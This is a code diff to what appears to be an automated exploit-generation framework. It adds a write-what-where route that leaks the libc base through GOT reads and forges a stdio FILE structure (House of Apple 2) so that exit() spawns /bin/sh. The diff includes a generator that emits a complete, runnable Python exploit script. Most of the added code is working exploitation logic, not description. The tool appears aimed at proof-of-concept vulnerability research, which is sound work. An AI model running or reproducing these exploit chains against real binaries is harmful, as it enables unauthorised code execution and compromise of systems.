@@ -137,10 +137,26 @@ def chain_primitive_stage(ctx) -> dict:
     win = win if win[0] else None
     pie = (target.mitigations or {}).get("pie") == "on"
 
-    # Without a reachable win we cannot demonstrate a hijack -- emit the technique recipe as L2.
-    # A PIE image is no longer a hard stop: if the target leaks a pointer, _pie_leak_chain recovers
-    # the base in-process and relocates the win address (below).
+    # Without a reachable win, a HIJACK has nothing to point at -- but an arbitrary WRITE does not
+    # need one. A write-what-where plus the arbitrary read that comes with it leaks the libc base
+    # out of a GOT slot and forges a FILE, so exit() calls system("/bin/sh"): no win function, no
+    # system() in the PLT, ASLR left on. That whole class used to stop here at an L2 recipe saying
+    # a leak-based chain was analyst work.
+    # A PIE image is still a hard stop for THIS route (the GOT slot and the array it writes
+    # through are only addressable once the image base is known); the win-based ladder below
+    # recovers a PIE base from an in-band leak instead.
     if win is None:
+        if vclass == "oob_write" and not pie:
+            staged = _stage_and_crawl(ctx, target, exe_dir=None)
+            if staged:
+                wd, exe_p, opts_p, model_p, width_p = staged
+                try:
+                    got = _www_shell(ctx, target, target_bytes, lead, vclass,
+                                     exe=exe_p, opts=opts_p, model=model_p, width=width_p)
+                finally:
+                    shutil.rmtree(wd, ignore_errors=True)
+                if got:
+                    return got
         recipe = _recipe(vclass, win, target_bytes, glibc=_glibc)
         why = "no reachable win function (a leak-based libc/one-gadget chain is analyst-gated)"
         _file_recipe(ctx, target, lead, vclass, win, recipe, why)
@@ -231,6 +247,13 @@ def chain_primitive_stage(ctx) -> dict:
         finally:
             shutil.rmtree(helper.parent, ignore_errors=True)
 
+        # A win exists but nothing reached it. For an arbitrary write that is not the end of the
+        # road: the FSOP route needs no win at all.
+        if vclass == "oob_write":
+            got = _www_shell(ctx, target, target_bytes, lead, vclass,
+                             exe=exe, opts=opts, model=model, width=width)
+            if got:
+                return got
         recipe = _recipe(vclass, win, target_bytes, glibc=_glibc)
         _file_recipe(ctx, target, lead, vclass, win, recipe,
                      f"drove {vclass} but control never reached {win_name}")
@@ -896,6 +919,250 @@ def _file_pie_l3(ctx, target, lead, vclass, win_name, *, win_vaddr, leak_opt, wr
     ctx.progress(pct=100, msg=f"L3 CONFIRMED (PIE): leak {leak_opt} -> base -> {win_name}")
     return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
             "metrics": {"chained": True, "level": "L3", "vclass": vclass, "pie": True, "off": off}}
+
+
+def _stage_and_crawl(ctx, target, *, exe_dir=None):
+    """Stage the target and share the menu op-model crawl, as the win-bearing path below does.
+    Returns (workdir, exe, opts, model, width) -- the caller owns the workdir -- or None."""
+    from ...db.dao import StringDAO
+    from ..dynamic import sandbox
+    from ..dynamic.heap_discover import shared_op_model
+    from ..fuzz import menu
+    workdir = Path(tempfile.mkdtemp(prefix="lykos-chain-"))
+    sandbox.protect_dir(getattr(ctx.content, "root", None))
+    try:
+        exe = workdir / "target.bin"
+        ctx.content.stage_target(target, exe.parent, exe.name)
+        exe.chmod(0o755)
+        strings = [x.value for x in StringDAO(ctx.conn).list_by_target(target.id)
+                   if getattr(x, "value", None)]
+        opts = menu.detect_menu(strings)
+        width, model = shared_op_model(ctx, target, workdir, exe, opts)
+        return workdir, exe, opts, model, width
+    except Exception:                                    # noqa: BLE001
+        observe.absorbed(_log, "staging for the write-what-where route")
+        shutil.rmtree(workdir, ignore_errors=True)
+        return None
+
+
+# ------------------------------------------- write-what-where -> shell, with no win function at all
+#: GOT slots worth READING for a libc leak, most-likely-resolved first. A lazily-bound slot still
+#: holds a PLT stub until its function has been called, and `resolve_libc_base` rejects that (the
+#: subtraction is not page aligned), so the order is "what a menu program has certainly called by
+#: the time it prints its first prompt" -- the stream setup and the prompt itself.
+_LEAK_SLOT_ORDER = ("setvbuf", "setbuf", "printf", "puts", "putchar", "fwrite", "fflush",
+                    "__printf_chk", "write", "scanf", "__isoc99_scanf", "fgets", "read", "malloc",
+                    "free", "memset", "strlen", "exit")
+
+
+def _leak_slots(target_bytes) -> list:
+    """[(got_address, libc symbol name)] to try the libc leak through, hot slots first."""
+    from . import rop
+    got = rop.got_entries(target_bytes)
+    return sorted(((a, n) for n, a in got.items()),
+                  key=lambda an: (_LEAK_SLOT_ORDER.index(an[1])
+                                  if an[1] in _LEAK_SLOT_ORDER else 99, an[1]))
+
+
+def _exit_sequences(opts, model, width) -> list:
+    """Input that makes a menu program RETURN FROM MAIN, so exit() flushes the forged FILE.
+
+    Two shapes, in order. An option the crawl learned NO fields for is the quit entry (every other
+    option asked for something); and a non-numeric token makes the `scanf("%d", &op) != 1` guard
+    that every one of these loops is written with fail, which is the same exit by another road --
+    and the one that still works when the crawl learned nothing at all."""
+    from ..fuzz import menu
+    seqs = [menu._scalar(o.encode(), width) for o in opts if not model.get(o)][:2]
+    return seqs + [b"q\n"]
+
+
+def _www_shell(ctx, target, target_bytes, lead, vclass, *, exe, opts, model, width):
+    """An unchecked indexed write + its paired read -> a spawned shell, with NO win function, no
+    `system` in the PLT and ASLR left on (`leak.indexed_write_fsop`). This is the branch the engine
+    did not have: `_oob_write_hijack` can only point a GOT slot at a win that exists, and without
+    one the whole class fell back to an L2 recipe saying a leak-based chain is analyst work.
+
+    The write option supplies the cells and the read option supplies both leaks (the libc base out
+    of a GOT slot, the forged FILE's own `_wide_data`), so the exploit is in-band and in one
+    process. Returns the filer's result dict, or None with the reason emitted."""
+    from ..dynamic import oob_index
+    from ..fuzz import menu
+    from . import exploit
+    from . import leak as _leak
+    from .exploit_stage import _libc_bytes_for
+    arrays = (oob_index._array_candidates(exploit.elf_objects_sized(target_bytes))
+              or oob_index._array_candidates_symfree(Path(exe)))
+    writers = [o for o in opts if o in model and "idx" in model[o] and len(model[o]) >= 2]
+    readers = [o for o in opts if o in model and "idx" in model[o] and len(model[o]) == 1]
+    libc_data = _libc_bytes_for(ctx, target) or b""
+    if not (arrays and writers and readers and libc_data):
+        ctx.emit("chain.www", payload={"ok": False, "arrays": len(arrays), "writers": len(writers),
+                 "readers": len(readers), "libc": len(libc_data),
+                 "note": "need a global array, a write option (index + value), a read option "
+                         "(index) and the linked libc to forge a FILE"})
+        return None
+    slots = _leak_slots(target_bytes)
+    exits = _exit_sequences(opts, model, width)
+    for arr in arrays:
+        base, stride = arr["addr"], arr.get("stride", 8) or 8
+        for writer in writers:
+            for reader in readers:
+                if ctx.should_cancel():
+                    return None
+
+                def _w(addr, val, _o=writer, _b=base, _st=stride):
+                    return _oob_write_seq(_o, model[_o], (addr - _b) // _st, val, None, model, width)
+
+                def _r(addr, _o=reader, _b=base, _st=stride):
+                    return (menu._scalar(_o.encode(), width)
+                            + menu._fill(model[_o], idx=str((addr - _b) // _st).encode(),
+                                         width=width))
+                res = _leak.indexed_write_fsop(
+                    Path(exe), Path(exe).parent, write_cell=_w, read_cell=_r,
+                    libc_data=libc_data, leak_slots=slots, scratch=base, exit_seqs=exits)
+                if res.get("ok"):
+                    ctx.progress(msg=f"indexed-write FSOP: option {writer} wrote 5 House-of-Apple-2 "
+                                     f"cells over {res['fp_name']} (libc {res['libc_base']:#x} "
+                                     f"leaked through option {reader}) -> shell")
+                    return _file_www_l3(ctx, target, lead, vclass, res, arr=arr, writer=writer,
+                                        reader=reader, width=width, model=model)
+                ctx.emit("chain.www", payload={"ok": False, "array": arr["name"], "writer": writer,
+                         "reader": reader, "libc_base": res.get("libc_base"),
+                         "note": res.get("reason", "")})
+                if "did not read back" in (res.get("reason") or ""):
+                    break                                # this writer cannot place a word; next one
+    return None
+
+
+def _www_repro_script(*, arr_name, arr_addr, stride, writer, reader, fields, rfields, width,
+                      exits) -> bytes:
+    """A self-contained reproducer. It redoes the LEAK (so it is not a hardcoded address): read a
+    GOT slot through the unchecked index, subtract the symbol's offset in the libc the target
+    links, keep the result only if it is page aligned -- then write the five cells and exit."""
+    import json as _json
+    return ("#!/usr/bin/env python3\n"
+            "# write-what-where -> House of Apple 2 reproducer (stdlib only).\n"
+            "#   usage: python3 exploit.py ./target.bin\n"
+            "import re, select, struct, subprocess, sys, time\n"
+            f"ARR={arr_addr:#x}; STRIDE={stride}; WRITER={writer!r}; READER={reader!r}\n"
+            f"WFIELDS={_json.dumps(fields)}; RFIELDS={_json.dumps(rfields)}; "
+            f"WIDTH={width!r}; EXITS={_json.dumps([e.decode('latin1') for e in exits])}\n"
+            "EXE=sys.argv[1] if len(sys.argv)>1 else './target.bin'\n"
+            "F={'flags':0x00,'wptr':0x28,'wide':0xa0,'vtable':0xd8,'wd_buf':0x30,'wd_vt':0xe0,\n"
+            "   'doalloc':0x68}\n"
+            "def run(*a):\n"
+            "    return subprocess.run(a, capture_output=True, text=True).stdout\n"
+            "libc=re.search(r'=>\\s*(\\S+libc\\.so\\.6)', run('ldd', EXE)).group(1)\n"
+            "S={}\n"
+            "for m in re.finditer(r'^([0-9a-f]+)\\s+\\S+\\s+(\\S+)', run('nm','-D','--defined-only',libc), re.M):\n"
+            "    S.setdefault(m.group(2).split('@')[0], int(m.group(1),16))\n"
+            "GOT={m.group(2): int(m.group(1),16) for m in\n"
+            "     re.finditer(r'^([0-9a-f]+)\\s+\\S+\\s+(\\S+?)(?:@\\S+)?\\s*$', run('objdump','-R',EXE), re.M)}\n"
+            "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,\n"
+            "                   stderr=subprocess.STDOUT,start_new_session=True)\n"
+            "def cell(v):\n"
+            "    s=str(v).encode()\n"
+            "    return s.ljust(WIDTH, b'\\x00') if WIDTH else s+b'\\n'\n"
+            "def op(seq, secs=0.3):\n"
+            "    p.stdin.write(seq); p.stdin.flush()\n"
+            "    out=b''; end=time.time()+secs\n"
+            "    while time.time()<end:\n"
+            "        if select.select([p.stdout],[],[],0.05)[0]:\n"
+            "            b=p.stdout.read1(65536)\n"
+            "            if not b: break\n"
+            "            out+=b\n"
+            "    return out\n"
+            "def drive(fields, idx, val):\n"
+            "    out=b''\n"
+            "    for f in fields:\n"
+            "        out+=cell(idx if f=='idx' else val)\n"
+            "    return out\n"
+            "def rd(addr):\n"
+            "    out=op(cell(READER)+drive(RFIELDS,(addr-ARR)//STRIDE,0))\n"
+            "    vals=[int(x)&(2**64-1) for x in re.findall(rb'-?\\d{2,}',out)]\n"
+            "    return vals\n"
+            "def wr(addr,val):\n"
+            "    v=struct.unpack('<q',struct.pack('<Q',val&(2**64-1)))[0]\n"
+            "    op(cell(WRITER)+drive(WFIELDS,(addr-ARR)//STRIDE,v))\n"
+            "op(b'',0.3)\n"
+            "base=None\n"
+            "for name,slot in GOT.items():\n"
+            "    if name not in S: continue\n"
+            "    for v in rd(slot):\n"
+            "        c=v-S[name]\n"
+            "        if c>0 and c%0x1000==0: base=c; break\n"
+            "    if base: break\n"
+            "assert base, 'no GOT read resolved a page-aligned libc base'\n"
+            "print('libc base %#x' % base)\n"
+            "fp=base+S['_IO_2_1_stderr_']\n"
+            "wide=next(v for v in rd(fp+F['wide']) if base<=v<base+0x600000)\n"
+            "wr(ARR+F['doalloc'], base+S['system'])\n"
+            "wr(wide+F['wd_vt'], ARR)\n"
+            "wr(fp+F['wptr'], 1)\n"
+            "wr(fp+F['vtable'], base+S['_IO_wfile_jumps'])\n"
+            "wr(fp+F['flags'], struct.unpack('<Q', b' /bin/sh')[0])\n"
+            "for e in EXITS:\n"
+            "    out=op(e.encode('latin1'),0.6)+op(b'id\\n',1.0)\n"
+            "    if b'uid=' in out:\n"
+            "        print(out.decode('latin1','replace')); print('SHELL'); break\n"
+            "else:\n"
+            "    print('no shell'); sys.exit(1)\n").encode()
+
+
+def _file_www_l3(ctx, target, lead, vclass, res, *, arr, writer, reader, width, model):
+    """File the no-win write-what-where shell as an L3 verified PoC (bundle = target + a runnable
+    leak-then-forge reproducer)."""
+    import json as _json
+
+    from ...db.dao import FindingDAO, PocDAO
+    from . import bundle
+    exits = _exit_sequences([writer, reader], model, width)
+    script = _www_repro_script(arr_name=arr["name"], arr_addr=arr["addr"],
+                               stride=arr.get("stride", 8) or 8, writer=writer, reader=reader,
+                               fields=model[writer], rfields=model[reader], width=width,
+                               exits=exits)
+    input_sha = ctx.put_artifact("www-fsop-repro", data=script)
+    meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
+            "exploit": f"{vclass}->House of Apple 2 (no win, libc leaked in band)",
+            "libc_base": hex(res["libc_base"]), "forged": res["fp_name"],
+            "tool_version": TOOL_VERSION}
+    data = bundle.build(ctx.content.path(target.sha256).read_bytes(), script, meta, b"",
+                        "stdin", [], None,
+                        primitive={"type": vclass, "target": 'system("/bin/sh")', "offset": None,
+                                   "confirmed": True, "note": "write-what-where -> FSOP"})
+    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
+    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
+                                     signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
+    eff = (f"working exploit ({vclass} -> arbitrary write -> code execution) with NO win function "
+           f"and no system() in the target's PLT: option {reader} read a GOT slot through the "
+           f"unchecked index to recover the libc base ({res['libc_base']:#x}, ASLR on) and then "
+           f"{res['fp_name']}'s own _wide_data; option {writer} wrote five House-of-Apple-2 cells "
+           f"over that FILE through {arr['name']}, with the fake wide jump table placed inside "
+           f"{arr['name']} itself; exit() flushed the forged FILE and its _IO_wfile_overflow "
+           f'called system(" /bin/sh"). Confirmed by a shell that echoed our marker -- every cell '
+           f"read back before the trigger, all in ONE process.")
+    fd = FindingDAO(ctx.conn)
+    cand = {"cwe": lead.cwe, "title": "Code execution (demonstrated): L3 arbitrary write -> FSOP",
+            "severity": "critical", "detector": "chain_primitive", "state": "poc-backed",
+            "confidence": 0.99, "authoritative": True, "title_only": True,
+            "dedup_key": f"chain:{vclass}:fsop:{target.id}", "site_detail": arr["name"],
+            "evidence": [{"channel": "effects", "detail": _json.dumps([{
+                "kind": "rce", "title": "Arbitrary write -> FSOP shell (no win function)",
+                "status": "demonstrated", "detail": eff,
+                "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
+                          "note": eff, "shell": True}}])}]}
+    fd.upsert(target.id, target.case_id, cand)
+    fid = fd.id_for_dedup(target.id, cand["dedup_key"])
+    if fid:
+        PocDAO(ctx.conn).set_finding(poc_id, fid)
+    ctx.emit("chain.done", payload={"applicable": True, "confirmed": True, "vclass": vclass,
+             "win": None, "exploit": "www-fsop", "shell": True, "writer": writer, "reader": reader,
+             "libc_base": hex(res["libc_base"]), "forged": res["fp_name"], "cells": res["cells"],
+             "bundle": bundle_sha})
+    ctx.progress(pct=100, msg=f'L3 CONFIRMED: {vclass} -> FSOP -> system("/bin/sh") (no win)')
+    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
+            "metrics": {"chained": True, "level": "L3", "vclass": vclass, "shell": True,
+                        "exploit": "www-fsop"}}
 
 
 def _file_recipe(ctx, target, lead, vclass, win, recipe, why) -> None:
